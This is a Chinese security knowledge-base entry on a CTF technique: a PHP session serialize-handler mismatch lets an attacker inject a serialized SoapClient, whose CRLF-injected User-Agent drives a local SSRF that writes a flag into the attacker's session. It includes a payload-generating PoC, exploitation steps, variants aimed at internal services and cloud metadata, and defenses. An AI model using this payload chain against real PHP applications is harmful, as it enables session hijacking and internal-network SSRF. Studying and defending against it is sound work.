---
id: web-php-deserialization-session-soapclient-crlf-ssrf
title: PHP session 处理器不一致注入 SoapClient：CRLF 头注入 + 本地 SSRF 把 flag 写回攻击者 session
type: scenario
domain: web
path: web/php/deserialization
technique: php-session-handler-mismatch-soapclient-crlf-ssrf
tags:
- php
- deserialization
- session
- soapclient
- crlf
- ssrf
- header-injection
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V176
  verified_at: '2026-11-06T17:11:10+08:00'
  notes: 已对照原文核对：php/php_binary/php_serialize 三种处理器、会话处理器不一致注入、SoapClient location/uri/user_agent CRLF+PHPSESSID、flag.php 的 REMOTE_ADDR 与 $_SESSION['flag'] 写入、PoC 均与原文代码及截图一致；LCTF2018 名称由原文代码字符串推断，PoC 未复跑
url: /docs/web/php/deserialization/web-php-deserialization-session-soapclient-crlf-ssrf/
draft: false
kb_aliases:
- session 反序列化 + CRLF + SSRF
- SoapClient session 反序列化
- php_serialize 处理器不一致
- session.serialize_handler 绕过
- SoapClient CRLF 注入
- LCTF2018 babyphp
- PHPSESSID 固定读 flag
---

## 一句话结论

当应用存储 session 与读取 session 使用的 `session.serialize_handler` 不一致（例如先用 `php_serialize` 写入、后用默认 `php` 读取）时，攻击者可以在 session 值里放入 `|<序列化的 SoapClient>`；读取端会把 `|` 后的内容反序列化成 SoapClient 对象，应用再把这个对象当字符串/可调用值处理时触发 SOAP 请求，向可控的 `location` 发起请求，并在 `user_agent` 中注入 CRLF 与 `Cookie: PHPSESSID=<攻击者会话>`，让仅允许 127.0.0.1 访问的 flag 接口把 flag 写进攻击者的 session。

## 原理

- **三种 session 序列化处理器**：
  - `php`：`键名|serialize(值)`，例如 `name|s:3:"xin";`；
  - `php_binary`：键名长度对应的 ASCII 字符 + 键名 + `serialize(值)`；
  - `php_serialize`：整个 `$_SESSION` 数组做 `serialize()`，例如 `a:1:{s:4:"name";s:3:"xin";}`。
- **处理器不一致是入口**：如果写入时用 `php_serialize`，session 文件中的值可以是任意字符串；读取时若被切回 `php` 处理器，解析器会把值里的第一个 `|` 当作“键名分隔符”，把 `|` 后面的内容直接 `unserialize()`。因此攻击者在 session 值中写入 `|O:10:"SoapClient":...`，读取端就得到一个攻击者可控的 SoapClient 对象。
- **SoapClient 的请求能力**：SoapClient 反序列化后可配置 `location`（请求发往的 URL）、`uri`（SOAP 命名空间）和 `user_agent`。当应用把该对象当作字符串/可调用值处理、或调用其不存在的方法时，会进入 SoapClient 的 SOAP 调用路径（`__call`），向 `location` 发送 HTTP 请求；`user_agent` 会被拼进请求头，攻击者可用 `\r\n` 注入额外头部乃至请求体。
- **CRLF 注入的作用**：本题 flag 接口只在 `$_SERVER['REMOTE_ADDR'] === '127.0.0.1'` 时把 flag 写入 `$_SESSION['flag']`。SoapClient 从本机发起请求天然满足 `REMOTE_ADDR=127.0.0.1`；在 `user_agent` 中注入 `\r\nCookie: PHPSESSID=<攻击者 session id>`，服务端处理请求时就会把 flag 写进攻击者指定的 session，而不是 SoapClient 自己的临时 session。之后攻击者用自己的 Cookie 访问页面/读取 session，即可拿到 flag。
- **为什么成立**：session 的反序列化输入完全来自攻击者，处理器切换又让 `|` 从普通字符变成结构分隔符；SoapClient 是 PHP 内置类，反序列化即可用，不需要额外 gadget；CRLF 让“只能本机访问”的接口把结果定向写回攻击者会话。

## 触发条件

- 应用使用 PHP session，且写入/读取的 `session.serialize_handler` 不一致（代码里 `ini_set`、`session_start($options)`、不同脚本/不同配置导致）。
- 攻击者能控制写入 session 的值（如 `$_SESSION['name'] = $_GET['name']`）。
- 目标启用了 SoapClient 扩展；应用会把 session 中的值当字符串/可调用对象处理（如 `implode`、字符串拼接、`call_user_func`）。
- 存在仅本机可访问的敏感接口（flag.php、内网 API），且其响应/结果会写入 session 或可被 CRLF 注入影响。

## 利用步骤

1. 确认 session 处理器：观察 `session.serialize_handler` 配置、代码中的 `ini_set`/`session_start` 调用，判断写入与读取是否使用不同处理器。
2. 用写入端处理器（如 `php_serialize`）把 `|` + 序列化的 SoapClient 写入 session 值；SoapClient 的 `location` 指向目标本机接口，`uri` 任意，`user_agent` 中放入 `\r\nCookie: PHPSESSID=<攻击者 session id>`。
3. 切换到读取端处理器（如默认 `php`）发起第二个请求，使 session 值被按 `键|值` 解析，`|` 后的 SoapClient 被反序列化。
4. 让应用对 session 值做字符串/可调用处理（本题为 `call_user_func('implode', array(reset($_SESSION), 'welcome...'))`），触发 SoapClient 向 `location` 发 SOAP 请求。
5. 本机 flag 接口收到请求，因 `REMOTE_ADDR=127.0.0.1` 且 Cookie 被 CRLF 注入为攻击者 session，把 flag 写入攻击者 session。
6. 用同一 `PHPSESSID` 访问应用，读取 `$_SESSION['flag']` 或对应的 session 文件，取得 flag。

## PoC

```php
<?php
// 生成写入 session 的恶意值（LCTF2018 babyphp 结构）
$url = "http://127.0.0.1/flag.php";
$a = new SoapClient(null, array(
    'user_agent' => "XiLitter\r\nCookie: PHPSESSID=123456",
    'uri'        => "XiLitter",
    'location'   => $url,
));
$ser = urlencode(serialize($a));
echo "|" . $ser;
?>
```

```text
# 第一次请求：用 php_serialize 处理器把 payload 写入 name
POST /?f=session_start&name=<上述 |O:10:"SoapClient"...>
serialize_handler=php_serialize

# 第二次请求：默认 php 处理器解析 session，触发 implode(SoapClient, ...)
GET /
Cookie: PHPSESSID=123456

# flag.php 侧逻辑（原文）：
# if ($_SERVER["REMOTE_ADDR"] === "127.0.0.1") { $_SESSION['flag'] = $flag; }
```

说明：原文用 LCTF2018 babyphp 演示，flag 接口截图与 payload 生成代码均在文中；本库未复跑。

## 变体与关联

- 变体：把 `location` 指向内网服务/云元数据，利用 CRLF 注入任意请求头或请求体，做 SSRF 打内网。
- 变体：用 `session.upload_progress` 或 `session_id` 固定把恶意值写入受害者 session，再触发读取端处理器。
- 变体：其他内置类（SoapClient、SimpleXMLElement 等）在反序列化后具备网络/文件能力，可替换 SoapClient。
- 关联：[[web-php-deser-roundcube-49113-session-injection-gpg-rce]]（session 自定义序列化注入）、[[web-php-deserialization-destruct-session-balance-forge]]（session 与反序列化业务逻辑）、[[web-generic-ssrf-redis-inline-protocol-crlf]]（CRLF 型 SSRF）。

## 检测与防御

- **统一处理器**：全站固定同一个 `session.serialize_handler`，不要在同一会话生命周期内切换；升级到 `php_serialize` 并确保所有入口一致。
- **输入隔离**：不要把用户输入原样写入 `$_SESSION`；对 session 值做类型/白名单校验，禁止其中出现序列化结构。
- **禁用危险类**：`unserialize` 使用 `allowed_classes` 白名单；不需要 SOAP 时禁用 `soap` 扩展。
- **SSRF/CRLF**：本机接口不要仅凭 `REMOTE_ADDR` 授权；对 `User-Agent` 等头做 CRLF 过滤；内网接口加独立鉴权。
- **检测**：session 文件中出现 `|O:`/`|a:` 等序列化结构；请求头/User-Agent 含 `\r\n`；本机对 flag/内网接口的异常 POST；同一 PHPSESSID 在短时间内出现跨处理器解析。
